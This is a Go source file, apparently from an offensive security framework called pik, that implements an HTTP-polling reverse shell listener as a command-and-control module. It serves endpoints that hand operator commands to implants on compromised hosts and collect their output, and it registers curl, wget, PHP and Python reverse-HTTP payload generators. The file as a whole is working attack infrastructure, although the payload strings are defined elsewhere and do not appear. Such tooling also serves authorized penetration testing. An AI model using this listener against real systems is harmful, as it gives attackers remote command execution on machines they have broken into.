package httpshell

import (
	"bytes"
	"fmt"
	"io"
	"net"
	"net/http"
	"sync"
	"time"

	"github.com/Chocapikk/pik/pkg/c2"
	"github.com/Chocapikk/pik/pkg/c2/session"
	"github.com/Chocapikk/pik/pkg/output"
	"github.com/Chocapikk/pik/pkg/payload"
)

func init() { c2.Register(New()) }

// Listener is an HTTP polling reverse shell listener.
type Listener struct {
	c2.SessionBase
	lhost   string
	lport   int
	server  *http.Server
	vln     *chanListener
	mu      sync.Mutex
	bridges map[string]*httpBridge
}

var payloads = c2.PayloadMap{
	"cmd/curl/reverse_http":   payload.CurlHTTP,
	"cmd/wget/reverse_http":   payload.WgetHTTP,
	"cmd/php/reverse_http":    payload.PHPHTTP,
	"cmd/python/reverse_http": payload.PythonHTTP,
}

func New() *Listener {
	return &Listener{bridges: make(map[string]*httpBridge)}
}

func (l *Listener) Name() string { return "httpshell" }

func (l *Listener) Setup(lhost string, lport int) error {
	l.lhost = lhost
	l.lport = lport

	mux := http.NewServeMux()
	mux.HandleFunc("/cmd", l.handleCmd)
	mux.HandleFunc("/out", l.handleOut)

	ln, err := net.Listen("tcp", fmt.Sprintf("%s:%d", lhost, lport))
	if err != nil {
		return fmt.Errorf("failed to start HTTP listener: %w", err)
	}
	l.server = &http.Server{Handler: mux}
	go l.server.Serve(ln) //nolint:errcheck

	l.vln = newChanListener(ln.Addr())
	l.Manager = session.NewManager(l.vln)
	l.Manager.Start()

	output.Status("HTTP shell listening on %s:%d", lhost, lport)
	return nil
}

func (l *Listener) GeneratePayload(_, payloadType string) (string, error) {
	return c2.ResolvePayload(payloads, l.lhost, l.lport, payloadType, payload.CurlHTTP)
}

func (l *Listener) Shutdown() error {
	if l.server != nil {
		l.server.Close()
	}
	return l.ShutdownManager()
}

func (l *Listener) getOrCreateBridge(remoteAddr string) *httpBridge {
	remoteIP, _, _ := net.SplitHostPort(remoteAddr)

	l.mu.Lock()
	defer l.mu.Unlock()

	if b, ok := l.bridges[remoteIP]; ok && !b.isClosed() {
		return b
	}

	b := newHTTPBridge(remoteAddr)
	l.bridges[remoteIP] = b
	l.vln.push(b.conn())
	return b
}

func (l *Listener) handleCmd(w http.ResponseWriter, r *http.Request) {
	b := l.getOrCreateBridge(r.RemoteAddr)
	select {
	case cmd := <-b.cmd:
		w.Write(cmd) //nolint:errcheck
	case <-time.After(200 * time.Millisecond):
		w.WriteHeader(http.StatusOK)
	}
}

func (l *Listener) handleOut(w http.ResponseWriter, r *http.Request) {
	b := l.getOrCreateBridge(r.RemoteAddr)
	data, err := io.ReadAll(io.LimitReader(r.Body, 10*1024*1024))
	if err != nil {
		w.WriteHeader(http.StatusBadRequest)
		return
	}
	select {
	case b.out <- data:
	default:
	}
	w.WriteHeader(http.StatusOK)
}

// --- HTTP bridge ---

// httpBridge connects HTTP polling handlers to a session.Session via channels.
type httpBridge struct {
	remoteAddr string
	cmd        chan []byte // user -> implant
	out        chan []byte // implant -> user
	closed     chan struct{}
}

func newHTTPBridge(remoteAddr string) *httpBridge {
	return &httpBridge{
		remoteAddr: remoteAddr,
		cmd:        make(chan []byte, 64),
		out:        make(chan []byte, 64),
		closed:     make(chan struct{}),
	}
}

func (b *httpBridge) isClosed() bool {
	select {
	case <-b.closed:
		return true
	default:
		return false
	}
}

func (b *httpBridge) conn() net.Conn { return &bridgeConn{bridge: b} }

// bridgeConn implements net.Conn over an httpBridge.
// Read returns implant output; Write sends user commands.
type bridgeConn struct {
	bridge  *httpBridge
	readBuf bytes.Buffer
}

func (c *bridgeConn) Read(p []byte) (int, error) {
	if c.readBuf.Len() > 0 {
		return c.readBuf.Read(p)
	}
	select {
	case data := <-c.bridge.out:
		n := copy(p, data)
		if n < len(data) {
			c.readBuf.Write(data[n:])
		}
		return n, nil
	case <-c.bridge.closed:
		return 0, io.EOF
	}
}

func (c *bridgeConn) Write(p []byte) (int, error) {
	buf := make([]byte, len(p))
	copy(buf, p)
	select {
	case c.bridge.cmd <- buf:
		return len(p), nil
	case <-c.bridge.closed:
		return 0, io.ErrClosedPipe
	}
}

func (c *bridgeConn) Close() error {
	select {
	case <-c.bridge.closed:
	default:
		close(c.bridge.closed)
	}
	return nil
}

func (c *bridgeConn) LocalAddr() net.Addr                { return bridgeAddr(c.bridge.remoteAddr) }
func (c *bridgeConn) RemoteAddr() net.Addr               { return bridgeAddr(c.bridge.remoteAddr) }
func (c *bridgeConn) SetDeadline(_ time.Time) error      { return nil }
func (c *bridgeConn) SetReadDeadline(_ time.Time) error  { return nil }
func (c *bridgeConn) SetWriteDeadline(_ time.Time) error { return nil }

type bridgeAddr string

func (a bridgeAddr) Network() string { return "http" }
func (a bridgeAddr) String() string  { return string(a) }

// --- virtual listener ---

// chanListener implements net.Listener with channel-based accept.
type chanListener struct {
	conns  chan net.Conn
	closed chan struct{}
	addr   net.Addr
}

func newChanListener(addr net.Addr) *chanListener {
	return &chanListener{
		conns:  make(chan net.Conn, 16),
		closed: make(chan struct{}),
		addr:   addr,
	}
}

func (cl *chanListener) push(c net.Conn) {
	select {
	case cl.conns <- c:
	case <-cl.closed:
	}
}

func (cl *chanListener) Accept() (net.Conn, error) {
	select {
	case c := <-cl.conns:
		return c, nil
	case <-cl.closed:
		return nil, net.ErrClosed
	}
}

func (cl *chanListener) Close() error {
	select {
	case <-cl.closed:
	default:
		close(cl.closed)
	}
	return nil
}

func (cl *chanListener) Addr() net.Addr { return cl.addr }
